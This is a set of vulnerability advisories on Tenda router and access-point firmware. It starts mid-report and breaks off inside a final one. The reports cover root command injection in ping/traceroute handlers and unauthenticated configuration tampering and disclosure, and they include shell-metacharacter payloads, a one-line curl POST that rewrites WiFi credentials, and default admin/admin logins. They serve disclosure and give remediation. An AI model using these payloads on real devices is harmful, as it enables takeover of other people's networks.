Audit all callers of `doSystemCmd` across all libraries and remediate the same pattern (e.g. `tracerouteSet`) as well.
2. Whitelist-validate inputs at the CGI layer (`bin/httpd`, `cgiPingSet`): after `cJSON_GetObjectStringValue("pingIp")` at `0x45f9cc` and before the `strcpy` at `0x45fabc`, accept only IPv4 dotted-decimal addresses with `inet_pton(AF_INET, ip) == 1` (length 3–15, charset `[0-9.]` only); reject any input containing `; | & $ ( ) space # newline`. Clamp `pingNum`/`pingSize` to sane ranges (e.g. count in [1,10], size in [4,1472]) and return an error on out-of-range values.
3. Fix the unbounded copy (`bin/httpd` `0x45faa8`–`0x45fabc`): replace `strcpy(fp+0x1050, src)` with a length-limited copy (e.g. `snprintf` with explicit truncation, or `memset` + `strncpy` + NUL termination). The pointer returned by `cJSON_GetObjectStringValue` points into the request body with fully attacker-controlled length; the current copy can overwrite the saved return address. The field is reused at `0x45fbec` / `0x45fe90` / `0x45ff58` / `0x0046004c` — all branches must converge on one validation function.
4. Defense in depth: implement ping diagnostics in-process with ICMP sockets (e.g. `SOCK_RAW` / iputils-style pinger) instead of spawning a subprocess; if an external ping is retained, invoke it with a fixed argv array and only collect controlled output.
5. Re-verify with this package's PoC after fixing: payload `127.0.0.1 -c 1;id #` must be rejected at the CGI layer and never reach `snprintf`/`system`; a 4000-byte payload must be truncated by the length check rather than overwrite the stack.

## References

- Firmware download (as present in the package): `https://static.tenda.com.cn/tdcweb/download/uploadfile/i26/US_i26V1.0re_V1.0.0.2(2714)_CN&EN_TDC01&TDE01_LowPower.zip`

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda O5 V1.0.0.8(5017): httpd goform tracerouteCommand cmdinput OS Command Injection (Authenticated, Root RCE)
content:
# Tenda O5 V1.0.0.8(5017): httpd goform tracerouteCommand cmdinput OS Command Injection (Authenticated, Root RCE)

## Vulnerability Type / CWE

- OS command injection (CWE-78)
- Reachable through the web management interface (an authenticated administrator, or an attacker using the factory default credentials `admin`/`admin`); executed as root, leading to full device compromise

## Affected Product

| Field | Value |
| --- | --- |
| Vendor | Tenda |
| Product | O5 V1.0 (Long Range outdoor AP) |
| Model | O5 V1.0 |
| Firmware filename & version | US_O5V1.0BR_V1.0.0.8(5017)_CN.bin (fireversion=V1.0.0.8(5017)) |
| Severity | High |
| Component | `bin/httpd` → `formtracerouteCommand` (0x3a4fc) → `libtpi.so::tpi_get_traceroute_output` → `sprintf` → `popen`; vulnerable parameter: first CGI parameter `cmdinput` |

Firmware package SHA-256: `2a020cc0f8930e2aa12a4a095f9450484f187b77f443126a7a76e825b24ec5b3`
Platform: ARM 32-bit little-endian / uClibc / Broadcom bcm47189.

## Vulnerability Description

The Tenda O5 outdoor AP is managed by a GoAhead-derived web server (`bin/httpd`); all `/goform/*` CGI requests are dispatched by `webs_Tenda_CGI_BIN_Handler` to the corresponding `formXxx` functions. The network diagnosis tools (ping/traceroute) are driven from `net_tool.js` via goform endpoints, with the back-end command-execution functions performing the actual probes.

Analysis of the dynamic symbol table and disassembly of `bin/httpd` confirms:

- `formtracerouteCommand` (exported at 0x0003a4fc) handles `/goform/tracerouteCommand`.
- It reads the `cmdinput`, `pro_ver`, `count`, `size` and `timeout` CGI parameters into a structure (integers at +0/+4/+8/+12, the `cmdinput` pointer at +16), then calls `tpi_get_traceroute_output` from `libtpi.so`.
- `tpi_get_traceroute_output` (libtpi.so file offset 0x78e0) performs no validation of `cmdinput` at all: it executes `sprintf(buf, "%s -p %d -m %d -q %d -w %d", cmdinput, struct[12], struct[0], struct[4], struct[8])` and then `popen(buf, "r")`.

Since the command string is interpreted by `/bin/sh`, an attacker can inject shell metacharacters such as `; id; #` into `cmdinput` to execute arbitrary commands. The server runs as root (`bin/httpd` starts as root), so the impact is complete device takeover.

Cross-check with the sibling function `tpi_get_ping_output`: the ping path validates `cmdinput` with `gethostbyname()` first and normalizes it with `inet_ntop()` to a pure IP address before splicing it into `ping %s -%d -c %d -s %d -W %d`, so the ping branch is not injectable. The traceroute branch lacks this validation, confirming the vulnerability is specific to `/goform/tracerouteCommand`.

## Root Cause Analysis

Code location file: `code_analysis.md` (provided with the package).

- File: `lib/libtpi.so`
- Function: `tpi_get_traceroute_output` (entry file offset 0x78e0)
- Key instruction range: 0x79e4-0x7a2c
- Format string constant (rodata offset 0x36544): `"%s -p %d -m %d -q %d -w %d"`

Key disassembly:

```
0x79e4: ldr r0, [r3, #8]            ; struct[8] (size)
0x79f4: str r5, [sp]                ; struct[12] -> %d (timeout)
0x79f8: str lr, [sp, #4]            ; struct[0]  -> %d (pro_ver)
0x79fc: str r0, [sp, #8]            ; struct[4]  -> %d (count)
0x7a08: bl  sprintf@plt             ; sprintf(buf, "%s -p %d -m %d -q %d -w %d",
                                    ;   cmdinput, struct[12], struct[0], struct[4], struct[8])
0x7a1c: ldr r3, [pc, #136]          ; mode string "r"
0x7a28: bl  popen@plt               ; popen(buf, "r")
```

`cmdinput` enters the `%s` conversion directly, with no whitelist or escaping — the shell then interprets any metacharacters it carries.

## Exploitation

Preconditions:

- Access to the device web management interface with an authenticated session. The package notes the default `/var/auth.txt` credentials are `admin`/`admin`, so an attacker reaching the interface can authenticate with defaults.

Steps (reproduction used Unicorn single-function emulation of `libtpi.so::tpi_get_traceroute_output` in ARM32 mode with `sprintf`/`popen`/`fread` hooks, because full-system emulation of `bin/httpd` segfaults on Broadcom nvram/cfm device access under chroot/qemu-user — see `httpd_qemu_segfault.log`):

1. Verify the firmware SHA-256 (`2a020cc0f8930e2aa12a4a095f9450484f187b77f443126a7a76e825b24ec5b3`) and unpack with `bash ./extract_firmware.sh` to `./squashfs-root/`.
2. Confirm the firmware identity: `cat ./squashfs-root/etc_ro/fireversion.cfg` → `fireversion=V1.0.0.8(5017)`.
3. Run `bash ./run_emulation.sh`, which locates `./squashfs-root/lib/libtpi.so` and invokes `python3 ./poc.py`; the PoC calls `tpi_get_traceroute_output(struct*, outbuf, size)` with `cmdinput="127.0.0.1; id; #"` (the first CGI parameter).
4. Inside the function, `sprintf` builds `127.0.0.1; id; # -p 10 -m 4 -q 3 -w 56` and `popen(buf, "r")` is intercepted; the hook genuinely executes the command string with the host `/bin/sh -c` and feeds the pipe output back through the `fread` hook:

```
[CMD-CONSTRUCTED] sprintf("%s -p %d -m %d -q %d -w %d", cmdinput="127.0.0.1; id; #") -> '127.0.0.1; id; # -p 10 -m 4 -q 3 -w 56'
[POPEN] popen("127.0.0.1; id; # -p 10 -m 4 -q 3 -w 56", "r")
[VERDICT] command injection -> shell executes injected payload
[POPEN-EXEC] real /bin/sh executed, stdout 52 bytes
[OUTPUT] fread captured from popen pipe: 'uid=0(root) gid=0(root) groups=0(root),1000(docker)
'
[HARNESS] final outbuf = 'uid=0(root) gid=0(root) groups=0(root),1000(docker)
'
```

The injected `id` command really executed and returned `uid=0(root)`, proving the command injection.

## Evidence

![Firmware extraction: SHA-256 verified, ZIP unpacked, binwalk squashfs extracted, fireversion=V1.0.0.8(5017) confirmed, key files libtpi.so and httpd located](O5_images/fig1.png)

![Unicorn emulation run: cmdinput 127.0.0.1; id; # constructs the injected traceroute command, popen executes it with a real /bin/sh, output uid=0(root) captured, exit code 0](O5_images/fig2.png)

Supporting text evidence from the package:

- `tenda-o5-traceroute-cmdi-01-boot.transcript` — target brought up: `[UNICORN] loading ./libtpi.so`, `calling tpi_get_traceroute_output@0x78e0`, Unicorn engine initialization.
- `tenda-o5-traceroute-cmdi-02-result.transcript` — target produced results: `[CMD-CONSTRUCTED]`, `[POPEN]`, `[POPEN-EXEC] real /bin/sh executed, stdout 52 bytes`, `[OUTPUT] fread captured: uid=0(root) ...`, `[HARNESS] final outbuf = ...`.
- `tenda-o5-traceroute-cmdi-03-run.transcript` — full `run_emulation.sh` output (exit code 0).
- `httpd_qemu_segfault.log` — record of the full-system QEMU failure that justified degrading to single-function emulation.
- `code_analysis.md` — code location and reverse-engineering notes.

## Impact

An authenticated attacker (or anyone able to log in with the default `admin`/`admin` credentials) can execute arbitrary operating-system commands as root on the AP via a single crafted request to `/goform/tracerouteCommand`, achieving complete control of the device: reading or modifying configuration, establishing persistence, attacking the networks the AP bridges, or rendering it unusable. Because the output of the injected command is returned through the traceroute output buffer, the endpoint also serves as a command-output channel for interactive post-exploitation.

## Remediation Suggestions

1. Input validation: strictly whitelist the `cmdinput` parameter of `/goform/tracerouteCommand` — allow only valid IPv4/IPv6 addresses or RFC 1123 hostnames (charset `[0-9A-Za-z.-]`, not starting with `-`) and reject all shell metacharacters (`; | & $ ( ) { } [ ]` quotes, `* ?`, whitespace, newlines, carriage returns).
2. Eliminate shell splicing: do not build command strings with `sprintf` for `popen()`/`system()`; instead use `fork` + `execv` to run `/usr/sbin/traceroute` (or busybox traceroute) with the target passed as a separate `argv` entry, removing `/bin/sh` interpretation entirely.
3. Least privilege: run the CGI handling process as a non-root user.
4. Default credentials and access control: the current `/var/auth.txt` defaults to `admin`/`admin` — force a password change on first login; require administrator authentication (session validation in addition to HTTP Basic) for diagnostic endpoints such as `tracerouteCommand`, and restrict the web management port to the intranet at the firewall layer.

## References

- Official firmware download: https://static.tenda.com.cn/tdcweb/download/uploadfile/O5/US_O5V1.0BR_V1.0.0.8(5017)_CN.zip

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda I25V2.0 V1.0.0.1(5674): httpd goform ping/traceroute tracerouteIp OS Command Injection (Authenticated, Root RCE)
content:
# Tenda I25V2.0 V1.0.0.1(5674): httpd goform ping/traceroute tracerouteIp OS Command Injection (Authenticated, Root RCE)

## Vulnerability Type / CWE

- OS command injection (CWE-78)
- Reachable through the web management interface (requires an authenticated session; the device ships with factory default credentials `admin`/`admin`); commands execute as root, yielding full device compromise

## Affected Product

| Field | Value |
| --- | --- |
| Vendor | Tenda |
| Product | I25V2.0 enterprise access point (AP) |
| Model | I25V2.0 |
| Firmware filename & version | US_i25V2.0qu_V1.0.0.1(5674)_CN&EN_TDC01.bin (fireversion=V1.0.0.1(5674)) |
| Severity | High |
| Component | `/bin/httpd` (Embedthis GoAhead 3.3.0) goform ping/traceroute handler — call site at vaddr 0x44f850; command-execution wrapper `doSystemCmd` in `/lib/libcommon.so` (symbol address 0xec90) |

Firmware ZIP SHA-256: `6683264491d92e9e4816511c9aba4516d0a758816c2e1281c95b77c98c52e08f`; firmware .bin SHA-256: `7a88331206f871feeb1db00208ede7e9e27cb266a442454b818fa3cdf4a49a58`
Platform: Linux 3.3.8 (Buildroot 2015.08), MIPS32 big-endian, uClibc, BusyBox v1.19.2.

## Vulnerability Description

The web management server `/bin/httpd` (Embedthis GoAhead) of Tenda I25V2.0 firmware V1.0.0.1(5674) handles the goform ping/traceroute (network diagnosis) functions by splicing the user-controlled `tracerouteIp` parameter, unfiltered, into the command string

```
traceroute -n -4 %s > /var/log_tr.txt &
```

and passing it to `doSystemCmd()` for execution by the system shell.

`doSystemCmd` is a command-execution wrapper exported by `/lib/libcommon.so` (symbol address 0xec90). Its disassembly shows it allocates a 0x400-byte stack buffer, zero-fills it with `memset`, formats the format string and user argument into the buffer with `vsnprintf(buf,0x400,fmt,&arg1)`, and finally calls `system(buf)`. In other words, `doSystemCmd(fmt, arg)` behaves as `system(sprintf(buf, 1024, fmt, arg))` with no shell metacharacter filtering whatsoever — a command-injection sink.

Because `tracerouteIp` undergoes no whitelist/blacklist validation, an attacker can inject `;`, `&`, `|`, `$()`, backticks and other shell metacharacters to execute arbitrary commands. Combined with the factory default credentials `admin`/`admin` (`sys.userpass=YWRtaW4=` in `webroot_ro/default.cfg`, Base64-decoding to `admin`), an attacker who logs into the management interface can trigger the injection from the Ping/Traceroute function of the diagnosis page and obtain a root shell.

## Root Cause Analysis

- Entry point: the web service is Embedthis GoAhead (`/bin/httpd`, version 3.3.0). Strings show `route uri=/goform handler=action`; goform actions dispatch to `cgi*` handlers — ping/traceroute is handled by `sym.cgiPingSet` (radare2 symbol address 0x457140) and its group (`cgiPingGet`/`cgiPingWatchdogGet`/`cgiPingWatchdogSet`). The front-end (`webroot_ro/goform/data.js`) exposes parameters `tracerouteIp`/`pingIp`/`pingNum`/`pingSize`, submitted via `/goform` by `webroot_ro/js/tool/diagnose.js`.
- Vulnerable call site — function `fcn.0044f850` in `bin/httpd` (MIPS big-endian):

```
0x0044f850  addiu a0, v0, -0x5600      ; a0 = &".rodata 0x48aa00" =
                                       ;   "traceroute -n -4 %s > /var/log_tr.txt &"
0x0044f854  lw    a1, 0x24(fp)         ; a1 = user-controlled tracerouteIp (unfiltered)
0x0044f858  lw    v0, -sym.imp.doSystemCmd(gp)
0x0044f85c  move  t9, v0
0x0044f860  jalr  t9                   ; doSystemCmd(fmt, tracerouteIp)
0x0044f864  nop
```

- The wrapper — `doSystemCmd @ 0xec90` in `/lib/libcommon.so`:

```
0x0000ecc0  addiu v1, fp, 0x28         ; buffer address
0x0000ecc8  move  a0, v1               ; buf
0x0000eccc  move  a1, zero             ; -> memset(buf, 0, ...)
0x0000ecd0  move  a2, v0               ; 0x400
0x0000ecd4  lw    v0, -0x7ecc(gp)      ; memset
0x0000ecdc  jalr  t9                   ; memset(buf, 0, 0x400)
...
0x0000ed34  addiu a1, zero, 0x400      ; size 1024
0x0000ed38  lw    a2, (var_430h)       ; fmt (contains %s)
0x0000ed3c  move  a3, v0               ; &arg1 (user parameter)
0x0000ed40  lw    v0, -0x7dac(gp)      ; vsnprintf
0x0000ed48  jalr  t9                   ; vsnprintf(buf,0x400,fmt,&arg1)
0x0000ed5c  lw    v0, -0x7d94(gp)      ; system
0x0000ed64  jalr  t9                   ; system(buf)
```

- Cross-verification: the `libcommon.so` import table contains `system`/`snprintf`/`vsnprintf`; the same `doSystemCmd` wrapper is referenced by `libapcommon.so`/`libwshared.so`, confirming it is the generic command-execution wrapper. No filtering logic exists anywhere between the format string and the dangerous call.

## Exploitation

Preconditions:

- Access to the management web service with an authenticated session (the device ships with default `admin`/`admin` credentials, so an attacker reaching the interface can log in with defaults).

Steps (reproduction used chroot + binfmt_misc + qemu-mips user-mode emulation so that all path resolution, command execution and file writes happen inside the firmware root filesystem — a plain `qemu-mips -L <root>` invocation was explicitly rejected by the audit because it falls back to host binaries and host paths):

1. Verify firmware SHA-256 and unpack the custom "nice" squashfs (608 files); confirm `fireversion=V1.0.0.1(5674)`.
2. Start the target: the firmware's own `/bin/httpd` reports GoAhead version `3.3.0` and listens on 127.0.0.1:80.
3. Replay the exact command httpd generates, with an A/B comparison of `tracerouteIp` values:

| Group | tracerouteIp value | Expected result |
| --- | --- | --- |
| A (benign) | `127.0.0.1` | traceroute runs normally, no injection traces |
| B (malicious) | `127.0.0.1; grep Uid /proc/self/status; echo PWNED_CNVD > /tmp/pwned_cnvd; cat /tmp/pwned_cnvd; #` | `Uid: 0 0 0 0` and `PWNED_CNVD` appear |

The trailing `#` comments out the original format string's `> /var/log_tr.txt &` suffix; the injected commands then run under the system shell as root. The firmware's BusyBox has no `id`/`whoami` applets, so the `Uid` line of `/proc/self/status` proves the execution identity.

4. Group B output:

```
traceroute to 127.0.0.1 (127.0.0.1), 30 hops max, 38 byte packets
  1  127.0.0.1  0.454 ms  0.009 ms  0.013 ms
Uid:    0   0   0   0
PWNED_CNVD
```

5. Second-pass forensics: re-entering the firmware root shows `/tmp/pwned_cnvd` exists with content `PWNED_CNVD` (owned by uid 0), proving the side effect was really written into the firmware filesystem. Final verdict: `VERDICT: SUCCESS`. Group A (benign input) produced no injection traces, excluding false positives.

Scope note (from the package): full HTTP-level triggering was not achieved in emulation because the goform action chain depends on the `cfmd` daemon, which fails to start under user-mode emulation (`get mtd size is fail` when accessing MTD flash; all HTTP requests return 4xx). The trigger therefore uses component-level replay of the exact command `doSystemCmd` generates; the only difference from the real chain is the parameter source (supplied by the script instead of HTTP request parsing) — everything after `doSystemCmd` is identical.

## Evidence

![Firmware verification: SHA-256 matched, rootfs unpacked (608 files), fireversion=V1.0.0.1(5674) confirmed](I25_images/fig1.png)

![Emulation boot: binfmt_misc registered, firmware httpd (GoAhead) reports version 3.3.0 and listens on 127.0.0.1:80, HTTP probe answered, with the cfmd/MTD limitation explained](I25_images/fig2.png)

![PoC run: group A benign command produces no injection traces, group B injected command shows Uid: 0 0 0 0 and PWNED_CNVD, /tmp/pwned_cnvd readable in the firmware root, VERDICT: SUCCESS](I25_images/fig3.png)

Supporting text evidence from the package:

- `cmdinj-poc-py.transcript` — full `poc.py` run (asset proof, boot trace, A/B output, root identity, second-pass forensics, VERDICT).
- `cmdinj-poc.transcript` — equivalent run of the shell PoC `poc_traceroute_cmdinj.sh`.
- `cmdinj-emulation.transcript` — `run_emulation.sh` boot record.
- `cmdinj-static.txt` — radare2 disassembly evidence (format string at .rodata 0x48aa00, call site 0x44f850, `doSystemCmd` memset/vsnprintf/system implementation, default password `sys.userpass=YWRtaW4=` decoding to `admin`, firmware version).

## Impact

An attacker who can reach the web interface and authenticate (default credentials make this trivial on unconfigured devices) can inject arbitrary system commands that execute as root on the AP, achieving full device control: reading or modifying configuration, planting persistence, pivoting into the network the AP serves, or bricking the device. The injected command also writes to `/var/log_tr.txt`, and arbitrary file writes anywhere on the flash-writable filesystem are possible via the same injection.

## Remediation Suggestions

1. Input filtering: strictly whitelist `tracerouteIp`/`pingIp` in the `cgiPingSet`/`cgiPingWatchdogSet`/traceroute handlers — allow only valid IPs or controlled hostnames (charset `[0-9A-Za-z.:-]`) and reject `; & | \ $ ( ) < >` backticks and newlines.
2. Eliminate `system()` string building: do not splice user input into formatted strings passed to `system()`/`popen()`; launch `traceroute` with `execve`/`execvp` argument arrays or `posix_spawn`, avoiding `/bin/sh` entirely.
3. Harden the `doSystemCmd` wrapper: add a safe wrapper in `libcommon.so` that forbids external request parameters as format-string arguments; centralize and audit all command construction with escaping.
4. Default credential governance: force a password change on first login instead of shipping `admin`/`admin`, removing the trivial path to the injection point.
5. Minimize attack surface: disable remote (WAN-side) management and telnet by default; bind the management interface to intranet/trusted segments only.
6. Upgrade to the vendor's fixed firmware and publish the patch promptly.

## References

- Official firmware download: https://static.tenda.com.cn/tdcweb/download/uploadfile/i25/US_i25V2.0qu_V1.0.0.1(5674)_CN&EN_TDC01.zip

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda F6 V5.0 V12.02.01.64: httpd goform setWizard Unauthenticated WiFi Configuration Modification (Pre-Auth, Config Tampering)
content:
# Tenda F6 V5.0 V12.02.01.64: httpd goform setWizard Unauthenticated WiFi Configuration Modification (Pre-Auth, Config Tampering)

## Vulnerability Type / CWE

- Unauthenticated access to a configuration-modifying endpoint (CWE-306, missing authentication for critical function) via an authentication-whitelist entry
- Allows tampering with WiFi SSID/password and WAN settings without any credentials

## Affected Product

| Field | Value |
| --- | --- |
| Vendor | Tenda (Shenzhen Jixiang Tenda Technology Co., Ltd.) |
| Product | F6 V5.0 wireless router |
| Model | F6 V5.0 |
| Firmware filename & version | US_F6V5.0re_V12.02.01.64_cn_TDC01.bin (V12.02.01.64) |
| Severity | High |
| Component | httpd web service `/goform/setWizard` endpoint, authenticated by `TWL300NWebsSecurityByCookieHandler` |

Firmware MD5: `087e8d0b701caf1499e50a87b5bd333d`; SHA256: `e77fd5e326babf7822072da43d00506ec4daed5574f092988732aea1d25d8f35`
Platform: eCos RTOS (Realtek RTL8196C/RTL8197 platform), MIPS big-endian; RTK0 header + LZMA-compressed monolithic binary at offset 0x2834, 2,604,984 bytes decompressed.

## Vulnerability Description

Tenda F6 V5.0 firmware V12.02.01.64 ships an HTTP server whose authentication function `TWL300NWebsSecurityByCookieHandler` checks the `ecos_pw` cookie. The URL whitelist of this function includes `/goform/setWizard` — the first-time setup wizard endpoint, which can modify core network configuration: WiFi SSID, WiFi password, WAN connection type, and PPPoE account credentials.

Because the endpoint sits in the authentication whitelist, an attacker on the same LAN needs no credentials at all: a single unauthenticated POST to `/goform/setWizard` rewrites the router's network configuration. Consequences include:

- Changing the WiFi SSID and password, disconnecting all wireless clients from the network.
- Changing the WAN connection type and PPPoE credentials, cutting the router off from the internet.
- Setting the WiFi to an open (password-less) network, exposing the LAN.

This vulnerability shares its root cause with the information-disclosure issue affecting the same whitelist (`getWifi`/`getStatus`/`getWAN` etc.): the `TWL300NWebsSecurityByCookieHandler` whitelist is overly broad and places sensitive operation endpoints alongside the login page in the pre-auth scope. The front-end JavaScript shows `setWizard` submits `module1=wifiBasicCfg&wifiSSID=<value>&wifiPwd=<value>` parameters, and the back-end performs no secondary authentication check.

## Root Cause Analysis

- Firmware structure: `US_F6V5.0re_V12.02.01.64_cn_TDC01.bin` is an RTK0-headed image with LZMA data at offset 0x2834, decompressing to a 2,604,984-byte eCos MIPS big-endian monolithic binary.
- Whitelist membership: the string `/goform/setWizard` at binary offset 0x188C0C lies inside the URL whitelist region (0x188BE8-0x188E7C) used by `TWL300NWebsSecurityByCookieHandler` (function name at offset 0x18F49C). URLs in this region skip the cookie authentication check (cookie name `ecos_pw`, see offset 0x188C22 and the format string `Set-Cookie: ecos_pw=%s:language=%s; path=/` at 0x1877DC).
- Submission logic: the JavaScript at offset 0x1D42C8 builds the payload — `data.wifiPwd=$("#quickPwd").val()`, `data.wifiSSID=$("#quickSSID").val()`, `data.module1="wifiBasicCfg"` — and at 0x1D43EE posts it via `$.post("goform/setWizard", subStr, ...)`. Success is signalled by `errCode == "0"`; the firmware's built-in success response literal `{"errCode":"0"}` is at offset 0x188EE6.
- Modifiable parameters (string offsets in the binary): `wifiSSID` (0x189704), `wifiPwd` (0x189724), `wanType` (0x189428), `wanPPPoEUser` (0x189534), `wanPPPoEPwd` (0x189544), submitted through the `module1=wifiBasicCfg` and `module2=wanBasicCfg` groups.
- Root cause: `setWizard` was designed for the initial setup wizard, which legitimately runs before login, so it was whitelisted. But the handler never restricts the endpoint to the unconfigured state — after initial setup is complete, any unauthenticated user can still invoke it to change core network settings.

## Exploitation

Preconditions:

- Network access to the router's web service (default management address 192.168.0.1). No credentials required.

Note on reproduction: this firmware is a Realtek eCos RTOS monolithic image (not a Linux filesystem); FirmAE extraction fails and QEMU does not support the Realtek MIPS SoC. The package therefore combines binary static verification with an end-to-end verification against an httpd behavior simulator built from the reverse-engineered firmware logic, plus the real-device procedure.

1. Extract the firmware and verify hashes (`bash ./extract_firmware.sh`): MD5 `087e8d0b701caf1499e50a87b5bd333d`, version strings `Product: Tenda F6V5.0`, `Version: V12.02.01.64`.
2. Static verification (`repro-driver-config-modify.py`) confirms the whitelist membership and lists the modifiable parameters:

```
[+] TWL300NWebsSecurityByCookieHandler at offset 0x18f49c
[*] Checking /goform/setWizard in whitelist...
    [VULN] /goform/setWizard is in auth bypass whitelist!
[*] Analyzing setWizard modifiable parameters:
    [VULN] wifiSSID ... wifiPwd ... wanType ... wanPPPoEUser ... wanPPPoEPwd
VERDICT SUCCESS — /goform/setWizard bypasses authentication
```

3. End-to-end verification against the behavior simulator (`mock_httpd.py`, which implements the whitelisted endpoints, `ecos_pw` cookie auth, the `{"errCode":"0"}` response and 401 denial exactly as reverse-engineered):

```
# dry-run (safe): read current config without modification
Current SSID: Tenda_F6_Home
Current Password: home12345

# live: unauthenticated POST /goform/setWizard
[MOCK-HTTPD] POST /goform/setWizard | whitelist=True | auth_ok=True | body='module1=wifiBasicCfg&wifiSSID=PWNED_CNVD&wifiPwd=hacked12345'
[VULN] Response: {"errCode":"0"}
[VULN] Configuration modified without authentication!
[VULN] Change confirmed - config tampered without authentication!
```

4. Independent read-back via the (also whitelisted) `getWifi` endpoint confirms the tampering persisted:

```bash
curl -s 'http://127.0.0.1:8080/goform/getWifi?modules=wifiBasicCfg'
# {"wifiBasicCfg": {"wifiSSID": "PWNED_CNVD", "wifiPwd": "hacked12345", "wifiSecurityMode": "wpa2psk"}}
```

5. Control test: a non-whitelisted configuration endpoint `/goform/setWifi` with the same unauthenticated POST is rejected with `HTTP/1.1 401 Unauthorized` — proving the bypass stems from the whitelist entry itself.

On a real device the equivalent commands are:

```bash
python3 ./poc_unauth_config_modify.py 192.168.0.1 --dry-run   # read current config (safe)
python3 ./poc_unauth_config_modify.py 192.168.0.1 --live      # modify (changes device config)
curl -m 5 -X POST 'http://192.168.0.1/goform/setWizard' \
  -d 'module1=wifiBasicCfg&wifiSSID=PWNED_CNVD&wifiPwd=hacked12345'
# -> {"errCode":"0"}, WiFi SSID changed to PWNED_CNVD
```

## Evidence

![Firmware extraction and verification: MD5/SHA256 matched, version strings confirm Tenda F6V5.0 V12.02.01.64](F6_images/fig1.png)

![Static verification: auth handler located, whitelist dumped with /goform/setWizard flagged VULN, all five modifiable parameters listed, VERDICT SUCCESS](F6_images/fig2.png)

![End-to-end run: dry-run reads SSID/password unauthenticated, live mode POSTs setWizard and receives errCode 0, read-back shows the new SSID](F6_images/fig3.png)

![Independent read-back returns the tampered wifiBasicCfg, and the control POST to non-whitelisted /goform/setWifi is rejected with 401 Unauthorized](F6_images/fig4.png)

Supporting text evidence from the package:

- `config-modify-repro.transcript` — full static verification output with `VERDICT SUCCESS — /goform/setWizard bypasses authentication`.
- `config-modify-sim.transcript` — full simulator session including per-request whitelist/auth audit lines and the 401 control test.

## Impact

An unauthenticated attacker with LAN access can permanently rewrite the router's core network configuration: disconnecting all wireless clients by changing the WiFi credentials, severing internet connectivity by altering WAN/PPPoE settings, or opening the wireless network to eavesdroppers by removing its password. The change is persistent (confirmed by read-back), and the attack is a single HTTP request with no credentials, making it trivial to execute repeatedly against the same target.

## Remediation Suggestions

1. Remove `/goform/setWizard` from the `TWL300NWebsSecurityByCookieHandler` authentication whitelist.
2. If the setup wizard must remain pre-auth accessible, add a device-state check in the `setWizard` handler so the endpoint is only callable without authentication while the router is uninitialized (first-time configuration); once configured, require login.
3. Add CSRF-token validation to all configuration-modifying POST endpoints (`setWizard`, `setWifi`, `setWAN`, etc.) to prevent cross-site request forgery.
4. Log all operations through `setWizard` and other configuration-modification endpoints (source IP, changed content, timestamp) for security auditing and anomaly detection.
5. Follow least privilege: split wizard endpoints into read-only query interfaces (loosely restricted) and write/modify interfaces (strictly authenticated).

## References

- Official firmware download: https://static.tenda.com.cn/tdcweb/download/uploadfile/F6/US_F6V5.0re_V12.02.01.64_cn_TDC01.zip

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda F6 V5.0 V12.02.01.64: httpd goform Sensitive Interfaces Unauthenticated Information Disclosure (Pre-Auth, WiFi Password and PPPoE Credential Exposure)
content:
# Tenda F6 V5.0 V12.02.01.64: httpd goform Sensitive Interfaces Unauthenticated Information Disclosure (Pre-Auth, WiFi Password and PPPoE Credential Exposure)

## Vulnerability Type / CWE

- Unauthenticated information disclosure (CWE-200), caused by an overly broad authentication whitelist (CWE-306, missing authentication for critical function)
- Exposed data includes the WiFi password in cleartext, PPPoE credentials, login authentication info and the full online device list

## Affected Product

| Field | Value |
| --- | --- |
| Vendor | Tenda (Shenzhen Jixiang Tenda Technology Co., Ltd.) |
| Product | F6 V5.0 wireless router |
| Model | F6 V5.0 |
| Firmware filename & version | US_F6V5.0re_V12.02.01.64_cn_TDC01.bin (V12.02.01.64) |
| Severity | High |
| Component | httpd web service goform endpoints `getWifi` / `getStatus` / `getWAN` / `getSysTools` / `getQos`, authenticated by `TWL300NWebsSecurityByCookieHandler` |

Firmware MD5: `087e8d0b701caf1499e50a87b5bd333d`; SHA256: `e77fd5e326babf7822072da43d00506ec4daed5574f092988732aea1d25d8f35`
Platform: eCos RTOS (Realtek RTL8196C/RTL8197 platform), MIPS big-endian; RTK0 header + LZMA-compressed monolithic binary at offset 0x2834, 2,604,984 bytes decompressed.

## Vulnerability Description

Tenda F6 V5.0 firmware V12.02.01.64 runs the eCos RTOS with a built-in HTTP server that authenticates web requests through the `TWL300NWebsSecurityByCookieHandler` function, which checks the `ecos_pw` field of the request Cookie. However, the URL whitelist used by this authentication function is severely mis-configured: several goform endpoints that return sensitive data are listed as authentication-exempt.

Affected endpoints:

1. `/goform/getWifi` — returns WiFi configuration including `wifiPwd` (WiFi password in cleartext), `wifiSSID`, security mode, etc.
2. `/goform/getStatus` — returns system status including `wifiBasicCfg` (contains the WiFi password), `systemInfo`, `wanAdvCfg`, etc.
3. `/goform/getWAN` — returns WAN configuration including `wanBasicCfg` (contains `wanPPPoEUser` and `wanPPPoEPwd`) and `lanCfg`.
4. `/goform/getSysTools` — returns system tools configuration including `loginAuth` (login authentication info) and `systemInfo`.
5. `/goform/getQos` — returns QoS configuration including `onlineList` (all online devices with MAC and IP addresses).

An attacker on the same LAN (or from the WAN side if remote web management is enabled) can simply send an HTTP GET request without any authentication cookie to any of these endpoints and retrieve the router's full sensitive configuration. No credentials are needed and the attack cost is minimal.

The root cause is that the whitelist mixes pages that legitimately need to be exempt (the login page `/login.html`, the initial setup wizard `/quickset.html`) with data-query endpoints that should be protected.

## Root Cause Analysis

- Authentication mechanism: `TWL300NWebsSecurityByCookieHandler` (binary offset 0x18F49C) implements Cookie-based web authentication. A successful login sets `Set-Cookie: ecos_pw=%s:language=%s; path=/` (offset 0x1877DC), where the password is stored base64-encoded in the cookie itself.
- Whitelist defect: the URL whitelist strings live at binary offsets 0x188BE8-0x188E7C. Requests matching these URLs skip the Cookie authentication check. The whitelist includes the sensitive data endpoints:

```
0x188DF0: "/goform/getStatus"    (leaks WiFi config / system info)
0x188E04: "/goform/getQos"       (leaks online device list)
0x188E14: "/goform/getWAN"       (leaks PPPoE credentials)
0x188E24: "/goform/getWifi"      (leaks WiFi password)
0x188E34: "/goform/getSysTools"  (leaks login auth info)
```

- Sensitive data fields (parameter-name strings in the binary): `wifiPwd` (0x189724), `wifiSSID` (0x189704), `wanPPPoEUser` (0x189534), `wanPPPoEPwd` (0x189544), `hasLoginPwd` (0x18A268), `softWare` (0x188EF4).
